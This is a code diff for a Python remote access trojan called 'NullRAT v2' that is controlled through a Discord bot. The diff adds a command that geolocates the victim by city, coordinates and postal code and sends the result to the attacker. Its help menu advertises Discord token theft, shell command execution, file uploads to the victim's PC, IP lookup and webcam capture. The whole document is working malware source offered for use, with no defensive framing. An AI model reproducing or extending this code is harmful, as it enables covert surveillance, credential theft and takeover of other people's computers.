@@ -49,7 +49,7 @@ def ft(p):
     
 @client.event
 async def on_ready():
-    await client.get_channel(notification_channel).send("RAT v2-alpha started on " + IP() + "\n Currently present in " + ogdir)
+    await client.get_channel(notification_channel).send("RAT v2 started on " + IP() + "\n Currently present in " + ogdir)
     
 @client.command() # Sends IP
 async def userip(ctx): 
@@ -69,6 +69,22 @@ async def exit(ctx, ip):
         await ctx.send(embed = EmbedGen("Information", 0xFF0505, "Given IP is " + IP(), "Exiting Bot"))
         await client.logout()
 
+@client.command()
+async def geolocate(ctx):
+    import urllib.request, json
+    with urllib.request.urlopen("https://geolocation-db.com/json") as url:
+        data = json.loads(url.read().decode())
+    embed = discord.Embed(title = "Geolocation Information", color = 0x0081FA)
+    embed.add_field(name = "Country code", value = data["country_code"], inline = False)
+    embed.add_field(name = "Country name", value = data["country_name"], inline = False)
+    embed.add_field(name = "City", value = data["city"], inline = False)
+    embed.add_field(name = "Latitude", value = data["latitude"], inline = False)
+    embed.add_field(name = "Longitude", value = data["longitude"], inline = False)
+    embed.add_field(name = "Postal code", value = data["postal"], inline = False)
+    embed.add_field(name = "State", value = data["state"], inline = False)
+    embed.set_footer(text = "Written by NullCode#7040")
+    await ctx.send(embed = embed)
+    
 @client.command() # Idea was Sp00p's, but this is a brand new implementation by me
 async def webcam(ctx): 
     import base64
@@ -217,8 +233,9 @@ async def shell(ctx, msg):
             
 @client.command()
 async def menu(ctx):
-    embed = discord.Embed(title="NullRAT v2-alpha Help", color=0x0081FA)
+    embed = discord.Embed(title="NullRAT v2 Help Menu", color=0x0081FA)
     embed.add_field(name="rat> token", value="Finds Discord Token", inline=False)
+    embed.add_field(name="rat> userip", value="Finds victim's public IP address", inline=False)
     embed.add_field(name="rat> gsl", value="Sends a general system log", inline=False)
     embed.add_field(name='rat> shell "`cmd`"', value="Executes shell commands", inline=False)
     embed.add_field(name="rat> upload <name> <link>", value="Sends file to victim's PC", inline=False)
